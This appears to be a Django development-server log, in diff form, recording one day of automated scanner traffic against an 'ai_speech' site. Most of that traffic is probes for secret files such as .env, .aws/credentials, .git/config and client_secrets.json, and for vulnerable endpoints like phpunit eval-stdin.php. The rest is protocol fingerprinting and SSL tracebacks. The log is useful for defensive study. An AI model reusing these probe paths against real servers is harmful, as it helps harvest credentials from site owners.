+----------------------------------------
+Not Found: /
+[09/Feb/2024 14:22:58] "GET / HTTP/1.1" 404 2172
+----------------------------------------
+Exception happened during processing of request from ('64.62.197.62', 57373)
+Traceback (most recent call last):
+  File "/usr/lib/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 178, in handle
+    self.handle_one_request()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 186, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+  File "/usr/lib/python3.7/ssl.py", line 1071, in recv_into
+    return self.read(nbytes, buffer)
+  File "/usr/lib/python3.7/ssl.py", line 929, in read
+    return self._sslobj.read(len, buffer)
+ssl.SSLError: [SSL: KRB5_S_TKT_NYV] unexpected eof while reading (_ssl.c:2570)
+----------------------------------------
+Not Found: /favicon.ico
+[09/Feb/2024 14:23:06] "GET /favicon.ico HTTP/1.1" 404 2223
+----------------------------------------
+Exception happened during processing of request from ('64.62.197.66', 12523)
+Traceback (most recent call last):
+  File "/usr/lib/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 178, in handle
+    self.handle_one_request()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 186, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+  File "/usr/lib/python3.7/ssl.py", line 1071, in recv_into
+    return self.read(nbytes, buffer)
+  File "/usr/lib/python3.7/ssl.py", line 929, in read
+    return self._sslobj.read(len, buffer)
+ssl.SSLError: [SSL: KRB5_S_TKT_NYV] unexpected eof while reading (_ssl.c:2570)
+----------------------------------------
+Not Found: /
+[09/Feb/2024 14:24:31] "GET / HTTP/1.1" 404 2172
+Not Found: /
+[09/Feb/2024 14:25:01] "GET / HTTP/1.1" 404 2172
+Not Found: /.env
+[09/Feb/2024 14:31:18] "GET /.env HTTP/1.0" 404 2197
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /
+[09/Feb/2024 14:55:59] "GET / HTTP/1.0" 400 66356
+Not Found: /.env
+[09/Feb/2024 15:27:41] "GET /.env HTTP/1.0" 404 2197
+Not Found: /
+[09/Feb/2024 15:27:41] "POST / HTTP/1.0" 404 2168
+Not Found: /druid/index.html
+[09/Feb/2024 16:13:10] "GET /druid/index.html HTTP/1.0" 404 2233
+Not Found: /
+[09/Feb/2024 16:41:18] "GET / HTTP/1.0" 404 2170
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /app/.git/HEAD
+[09/Feb/2024 16:59:00] "GET /app/.git/HEAD HTTP/1.0" 400 65488
+Not Found: /
+[09/Feb/2024 17:04:01] "GET / HTTP/1.0" 404 2170
+Not Found: /HNAP1/
+[09/Feb/2024 17:04:02] "POST /HNAP1/ HTTP/1.0" 404 2207
+Not Found: /
+[09/Feb/2024 17:32:15] "GET / HTTP/1.0" 404 2170
+Not Found: /cgi-bin/test.cgi
+[09/Feb/2024 17:48:45] "GET /cgi-bin/test.cgi HTTP/1.0" 404 2236
+Not Found: /
+[09/Feb/2024 18:08:01] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[09/Feb/2024 18:52:17] "GET / HTTP/1.0" 404 2170
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /robots.txt
+[09/Feb/2024 19:17:35] "GET /robots.txt HTTP/1.0" 400 15770
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /humans.txt
+[09/Feb/2024 19:17:35] "GET /humans.txt HTTP/1.0" 400 15774
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /ads.txt
+[09/Feb/2024 19:17:35] "GET /ads.txt HTTP/1.0" 400 15757
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /
+[09/Feb/2024 19:17:36] "GET / HTTP/1.0" 400 66380
+Not Found: /
+[09/Feb/2024 20:05:29] "GET / HTTP/1.0" 404 2170
+Not Found: /
+[09/Feb/2024 20:17:14] "GET / HTTP/1.0" 404 2167
+Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+[09/Feb/2024 20:17:15] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 2336
+Not Found: /.git/config
+[09/Feb/2024 20:17:15] "GET /.git/config HTTP/1.0" 404 2218
+Not Found: /
+[09/Feb/2024 20:17:16] "GET / HTTP/1.0" 404 2167
+Not Found: /.DS_Store
+[09/Feb/2024 20:17:17] "GET /.DS_Store HTTP/1.0" 404 2212
+Not Found: /.env
+[09/Feb/2024 20:17:18] "GET /.env HTTP/1.0" 404 2197
+Not Found: /.env
+[09/Feb/2024 20:17:19] "POST /.env HTTP/1.0" 404 2198
+Not Found: /.env.prod
+[09/Feb/2024 20:17:19] "GET /.env.prod HTTP/1.0" 404 2212
+Not Found: /.env.prod
+[09/Feb/2024 20:17:20] "POST /.env.prod HTTP/1.0" 404 2213
+Not Found: /.env.production
+[09/Feb/2024 20:17:21] "GET /.env.production HTTP/1.0" 404 2230
+Not Found: /.env.production
+[09/Feb/2024 20:17:22] "POST /.env.production HTTP/1.0" 404 2231
+Not Found: /redmine/.env
+[09/Feb/2024 20:17:22] "GET /redmine/.env HTTP/1.0" 404 2221
+Not Found: /redmine/.env
+[09/Feb/2024 20:17:23] "POST /redmine/.env HTTP/1.0" 404 2222
+Not Found: /__tests__/test-become/.env
+[09/Feb/2024 20:17:24] "GET /__tests__/test-become/.env HTTP/1.0" 404 2263
+Not Found: /__tests__/test-become/.env
+[09/Feb/2024 20:17:24] "POST /__tests__/test-become/.env HTTP/1.0" 404 2264
+Not Found: /
+[09/Feb/2024 20:17:25] "GET / HTTP/1.0" 404 2167
+Not Found: /
+[09/Feb/2024 20:17:26] "POST / HTTP/1.0" 404 2168
+Not Found: /frontend_dev.php/$
+[09/Feb/2024 20:17:27] "GET /frontend_dev.php/$ HTTP/1.0" 404 2239
+Not Found: /debug/default/view
+[09/Feb/2024 20:17:27] "GET /debug/default/view?panel=config/frontend_dev.php HTTP/1.0" 404 2269
+Not Found: /debug/default/view
+[09/Feb/2024 20:17:28] "GET /debug/default/view?panel=config HTTP/1.0" 404 2252
+Not Found: /debug/default/view.html
+[09/Feb/2024 20:17:29] "GET /debug/default/view.html HTTP/1.0" 404 2254
+Not Found: /debug/default/view
+[09/Feb/2024 20:17:30] "GET /debug/default/view HTTP/1.0" 404 2239
+Not Found: /frontend/web/debug/default/view
+[09/Feb/2024 20:17:31] "GET /frontend/web/debug/default/view HTTP/1.0" 404 2278
+Not Found: /web/debug/default/view
+[09/Feb/2024 20:17:31] "GET /web/debug/default/view HTTP/1.0" 404 2251
+Not Found: /sapi/debug/default/view
+[09/Feb/2024 20:17:32] "GET /sapi/debug/default/view HTTP/1.0" 404 2254
+Not Found: /config.json
+[09/Feb/2024 20:17:32] "GET /config.json HTTP/1.0" 404 2218
+Not Found: /AwsConfig.json
+[09/Feb/2024 20:17:33] "GET /AwsConfig.json HTTP/1.0" 404 2227
+Not Found: /awsconfig.json
+[09/Feb/2024 20:17:34] "GET /awsconfig.json HTTP/1.0" 404 2227
+Not Found: /aws.json
+[09/Feb/2024 20:17:35] "GET /aws.json HTTP/1.0" 404 2209
+Not Found: /conf.json
+[09/Feb/2024 20:17:35] "GET /conf.json HTTP/1.0" 404 2212
+Not Found: /env.json
+[09/Feb/2024 20:17:36] "GET /env.json HTTP/1.0" 404 2209
+Not Found: /.vscode/sftp.json
+[09/Feb/2024 20:17:37] "GET /.vscode/sftp.json HTTP/1.0" 404 2236
+Not Found: /.json
+[09/Feb/2024 20:17:38] "GET /.json HTTP/1.0" 404 2200
+Not Found: /smtp.json
+[09/Feb/2024 20:17:38] "GET /smtp.json HTTP/1.0" 404 2212
+Not Found: /db.json
+[09/Feb/2024 20:17:39] "GET /db.json HTTP/1.0" 404 2206
+Not Found: /sendgrid.json
+[09/Feb/2024 20:17:40] "GET /sendgrid.json HTTP/1.0" 404 2224
+Not Found: /ws-config.json
+[09/Feb/2024 20:17:41] "GET /ws-config.json HTTP/1.0" 404 2227
+Not Found: /_wpeprivate/config.json
+[09/Feb/2024 20:17:41] "GET /_wpeprivate/config.json HTTP/1.0" 404 2254
+Not Found: /deployment-config.json
+[09/Feb/2024 20:17:42] "GET /deployment-config.json HTTP/1.0" 404 2251
+Not Found: /sftp-config.json
+[09/Feb/2024 20:17:43] "GET /sftp-config.json HTTP/1.0" 404 2233
+Not Found: /db/robomongo.json
+[09/Feb/2024 20:17:44] "GET /db/robomongo.json HTTP/1.0" 404 2236
+Not Found: /robomongo.json
+[09/Feb/2024 20:17:45] "GET /robomongo.json HTTP/1.0" 404 2227
+Not Found: /client_secrets.json
+[09/Feb/2024 20:17:45] "GET /client_secrets.json HTTP/1.0" 404 2242
+Not Found: /user-config.json
+[09/Feb/2024 20:17:46] "GET /user-config.json HTTP/1.0" 404 2233
+Not Found: /ssh-config.json
+[09/Feb/2024 20:17:47] "GET /ssh-config.json HTTP/1.0" 404 2230
+Not Found: /database-config.json
+[09/Feb/2024 20:17:48] "GET /database-config.json HTTP/1.0" 404 2245
+Not Found: /config/default.json
+[09/Feb/2024 20:17:48] "GET /config/default.json HTTP/1.0" 404 2242
+Not Found: /config/config.json
+[09/Feb/2024 20:17:49] "GET /config/config.json HTTP/1.0" 404 2239
+Not Found: /credentials/config.json
+[09/Feb/2024 20:17:50] "GET /credentials/config.json HTTP/1.0" 404 2254
+Not Found: /
+[09/Feb/2024 20:17:52] "GET / HTTP/1.0" 404 2167
+Not Found: /.aws/credentials
+[09/Feb/2024 20:17:52] "GET /.aws/credentials HTTP/1.0" 404 2233
+Not Found: /app_dev.php/_profiler/open
+[09/Feb/2024 20:17:53] "GET /app_dev.php/_profiler/open?file=app/config/parameters.yml HTTP/1.0" 404 2294
+Not Found: /_profiler/open
+[09/Feb/2024 20:17:54] "GET /_profiler/open?file=app/config/parameters.yml HTTP/1.0" 404 2258
+Not Found: /app/config/parameters.yml
+[09/Feb/2024 20:17:55] "GET /app/config/parameters.yml HTTP/1.0" 404 2260
+Not Found: /config/parameters.yml
+[09/Feb/2024 20:17:55] "GET /config/parameters.yml HTTP/1.0" 404 2248
+Not Found: /parameters.yml
+[09/Feb/2024 20:17:56] "GET /parameters.yml HTTP/1.0" 404 2227
+Not Found: /_profiler/phpinfo
+[09/Feb/2024 20:17:57] "GET /_profiler/phpinfo HTTP/1.0" 404 2236
+Not Found: /app_dev.php/_profiler/phpinfo
+[09/Feb/2024 20:17:58] "GET /app_dev.php/_profiler/phpinfo HTTP/1.0" 404 2272
+Not Found: /phpinfo.php
+[09/Feb/2024 20:17:58] "GET /phpinfo.php HTTP/1.0" 404 2218
+Not Found: /owncloud/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php
+[09/Feb/2024 20:17:59] "GET /owncloud/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php HTTP/1.0" 404 2413
+Not Found: /info.php
+[09/Feb/2024 20:18:00] "GET /info.php HTTP/1.0" 404 2209
+Not Found: /
+[09/Feb/2024 20:18:01] "GET / HTTP/1.0" 404 2167
+Not Found: /api/index.php/v1/config/application
+[09/Feb/2024 20:18:01] "GET /api/index.php/v1/config/application?public=true HTTP/1.0" 404 2302
+Not Found: /
+[09/Feb/2024 20:46:35] "GET / HTTP/1.1" 404 2172
+----------------------------------------
+Exception happened during processing of request from ('162.243.143.51', 40002)
+Traceback (most recent call last):
+  File "/usr/lib/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 178, in handle
+    self.handle_one_request()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 186, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+  File "/usr/lib/python3.7/ssl.py", line 1071, in recv_into
+    return self.read(nbytes, buffer)
+  File "/usr/lib/python3.7/ssl.py", line 929, in read
+    return self._sslobj.read(len, buffer)
+ssl.SSLError: [SSL: KRB5_S_TKT_NYV] unexpected eof while reading (_ssl.c:2570)
+----------------------------------------
+Not Found: /
+[09/Feb/2024 20:49:04] "GET / HTTP/1.1" 404 2172
+Invalid HTTP_HOST header: 'mentishub.com.tr'. You may need to add 'mentishub.com.tr' to ALLOWED_HOSTS.
+Bad Request: /
+[09/Feb/2024 21:58:55] "GET / HTTP/1.0" 400 65468
+Not Found: /boaform/admin/formLogin
+[09/Feb/2024 22:50:25] "POST /boaform/admin/formLogin HTTP/1.0" 404 2258
+----------------------------------------
+Exception happened during processing of request from ('23.92.24.100', 60388)
+Traceback (most recent call last):
+  File "/usr/lib/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 176, in handle
+    self.handle_one_request()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 186, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+  File "/usr/lib/python3.7/ssl.py", line 1071, in recv_into
+    return self.read(nbytes, buffer)
+  File "/usr/lib/python3.7/ssl.py", line 929, in read
+    return self._sslobj.read(len, buffer)
+ssl.SSLError: [SSL: KRB5_S_TKT_NYV] unexpected eof while reading (_ssl.c:2570)
+----------------------------------------
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com:8001'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /
+[09/Feb/2024 23:09:02] "GET / HTTP/1.0" 400 64035
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com:8001'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /nice ports,/Trinity.txt.bak
+[09/Feb/2024 23:09:04] "GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0" 400 64344
+[09/Feb/2024 23:09:05] code 400, message Bad request syntax ('#ST')
+[09/Feb/2024 23:09:05] "#ST" 400 -
+----------------------------------------
+Exception happened during processing of request from ('23.92.24.100', 58134)
+Traceback (most recent call last):
+  File "/usr/lib/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 176, in handle
+    self.handle_one_request()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 186, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+  File "/usr/lib/python3.7/ssl.py", line 1071, in recv_into
+    return self.read(nbytes, buffer)
+  File "/usr/lib/python3.7/ssl.py", line 929, in read
+    return self._sslobj.read(len, buffer)
+ssl.SSLError: [SSL: KRB5_S_TKT_NYV] unexpected eof while reading (_ssl.c:2570)
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('23.92.24.100', 58136)
+Traceback (most recent call last):
+  File "/usr/lib/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 176, in handle
+    self.handle_one_request()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 186, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+  File "/usr/lib/python3.7/ssl.py", line 1071, in recv_into
+    return self.read(nbytes, buffer)
+  File "/usr/lib/python3.7/ssl.py", line 929, in read
+    return self._sslobj.read(len, buffer)
+ssl.SSLError: [SSL: KRB5_S_TKT_NYV] unexpected eof while reading (_ssl.c:2570)
+----------------------------------------
+Invalid HTTP_HOST header: 'host-45-139-199-217.olfedns.com:8001'. You may need to add 'host-45-139-199-217.olfedns.com' to ALLOWED_HOSTS.
+Bad Request: /
+[09/Feb/2024 23:09:10] "OPTIONS / HTTP/1.0" 400 64063
+[09/Feb/2024 23:09:11] code 400, message Bad request version ('RTSP/1.0')
+[09/Feb/2024 23:09:11] "OPTIONS / RTSP/1.0" 400 -
+----------------------------------------
+Exception happened during processing of request from ('23.92.24.100', 58168)
+Traceback (most recent call last):
+  File "/usr/lib/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 176, in handle
+    self.handle_one_request()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 186, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+  File "/usr/lib/python3.7/ssl.py", line 1071, in recv_into
+    return self.read(nbytes, buffer)
+  File "/usr/lib/python3.7/ssl.py", line 929, in read
+    return self._sslobj.read(len, buffer)
+ssl.SSLError: [SSL: KRB5_S_TKT_NYV] unexpected eof while reading (_ssl.c:2570)
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('23.92.24.100', 43574)
+Traceback (most recent call last):
+  File "/usr/lib/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 176, in handle
+    self.handle_one_request()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 186, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+  File "/usr/lib/python3.7/ssl.py", line 1071, in recv_into
+    return self.read(nbytes, buffer)
+  File "/usr/lib/python3.7/ssl.py", line 929, in read
+    return self._sslobj.read(len, buffer)
+ssl.SSLError: [SSL: KRB5_S_TKT_NYV] unexpected eof while reading (_ssl.c:2570)
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('23.92.24.100', 43586)
+Traceback (most recent call last):
+  File "/usr/lib/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 176, in handle
+    self.handle_one_request()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 186, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+  File "/usr/lib/python3.7/ssl.py", line 1071, in recv_into
+    return self.read(nbytes, buffer)
+  File "/usr/lib/python3.7/ssl.py", line 929, in read
+    return self._sslobj.read(len, buffer)
+ssl.SSLError: [SSL: KRB5_S_TKT_NYV] unexpected eof while reading (_ssl.c:2570)
+----------------------------------------
+[09/Feb/2024 23:09:18] code 400, message Bad request syntax ('HELP')
+[09/Feb/2024 23:09:18] "HELP" 400 -
+[09/Feb/2024 23:09:19] code 400, message Bad request syntax ('\x16\x03\x00\x00S\x01\x00\x00O\x03\x00?G×÷º,îê²`~ó\x00ý\x82{¹Õ\x96Èw\x9bæÄÛ<=Ûoï\x10n\x00\x00(\x00\x16\x00\x13\x00')
+[09/Feb/2024 23:09:19] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[09/Feb/2024 23:09:20] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00*%à\x00\x00\x00\x00\x00Cookie:')
+[09/Feb/2024 23:09:20] "  *%à     Cookie: mstshash=beio" 400 -
+[09/Feb/2024 23:09:20] code 400, message Bad request version ('\x00/\x00')
+[09/Feb/2024 23:09:20] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[09/Feb/2024 23:09:21] code 400, message Bad request syntax ('\x00\x00\x00qj\x81n0\x81k¡\x03\x02\x01\x05¢\x03\x02\x01')
+[09/Feb/2024 23:09:21] "   qjn0k¡¢" 400 -
+----------------------------------------
+Exception happened during processing of request from ('23.92.24.100', 43648)
+Traceback (most recent call last):
+  File "/usr/lib/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 176, in handle
+    self.handle_one_request()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 186, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+  File "/usr/lib/python3.7/ssl.py", line 1071, in recv_into
+    return self.read(nbytes, buffer)
+  File "/usr/lib/python3.7/ssl.py", line 929, in read
+    return self._sslobj.read(len, buffer)
+ssl.SSLError: [SSL: KRB5_S_TKT_NYV] unexpected eof while reading (_ssl.c:2570)
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('23.92.24.100', 43662)
+Traceback (most recent call last):
+  File "/usr/lib/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 176, in handle
+    self.handle_one_request()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 186, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+  File "/usr/lib/python3.7/ssl.py", line 1071, in recv_into
+    return self.read(nbytes, buffer)
+  File "/usr/lib/python3.7/ssl.py", line 929, in read
+    return self._sslobj.read(len, buffer)
+ssl.SSLError: [SSL: KRB5_S_TKT_NYV] unexpected eof while reading (_ssl.c:2570)
+----------------------------------------
+[09/Feb/2024 23:09:26] code 400, message Bad request syntax ('\x01default')
+[09/Feb/2024 23:09:26] "default" 400 -
+[09/Feb/2024 23:09:27] code 400, message Bad request syntax ('0\x84\x00\x00\x00-\x02\x01\x07c\x84\x00\x00\x00$\x04\x00')
+[09/Feb/2024 23:09:27] "0   -c   $ " 400 -
+----------------------------------------
+Exception happened during processing of request from ('23.92.24.100', 58592)
+Traceback (most recent call last):
+  File "/usr/lib/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 176, in handle
+    self.handle_one_request()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 186, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+  File "/usr/lib/python3.7/ssl.py", line 1071, in recv_into
+    return self.read(nbytes, buffer)
+  File "/usr/lib/python3.7/ssl.py", line 929, in read
+    return self._sslobj.read(len, buffer)
+ssl.SSLError: [SSL: KRB5_S_TKT_NYV] unexpected eof while reading (_ssl.c:2570)
+----------------------------------------
+[09/Feb/2024 23:09:29] code 400, message Bad request version ('SIP/2.0')
+[09/Feb/2024 23:09:29] "OPTIONS sip:nm SIP/2.0" 400 -
+----------------------------------------
+Exception happened during processing of request from ('23.92.24.100', 58606)
+Traceback (most recent call last):
+  File "/usr/lib/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 176, in handle
+    self.handle_one_request()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 186, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+  File "/usr/lib/python3.7/ssl.py", line 1071, in recv_into
+    return self.read(nbytes, buffer)
+  File "/usr/lib/python3.7/ssl.py", line 929, in read
+    return self._sslobj.read(len, buffer)
+ssl.SSLError: [SSL: KRB5_S_TKT_NYV] unexpected eof while reading (_ssl.c:2570)
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('23.92.24.100', 58612)
+Traceback (most recent call last):
+  File "/usr/lib/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 176, in handle
+    self.handle_one_request()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 186, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+  File "/usr/lib/python3.7/ssl.py", line 1071, in recv_into
+    return self.read(nbytes, buffer)
+  File "/usr/lib/python3.7/ssl.py", line 929, in read
+    return self._sslobj.read(len, buffer)
+ssl.SSLError: [SSL: KRB5_S_TKT_NYV] unexpected eof while reading (_ssl.c:2570)
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('23.92.24.100', 50664)
+Traceback (most recent call last):
+  File "/usr/lib/python3.7/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.7/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.7/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 176, in handle
+    self.handle_one_request()
+  File "/var/www/ai_speech/venv/lib/python3.7/site-packages/django/core/servers/basehttp.py", line 186, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.7/socket.py", line 589, in readinto
+    return self._sock.recv_into(b)
+  File "/usr/lib/python3.7/ssl.py", line 1071, in recv_into
+    return self.read(nbytes, buffer)
+  File "/usr/lib/python3.7/ssl.py", line 929, in read
+    return self._sslobj.read(len, buffer)
+ssl.SSLError: [SSL: KRB5_S_TKT_NYV] unexpected eof while reading (_ssl.c:2570)
+----------------------------------------
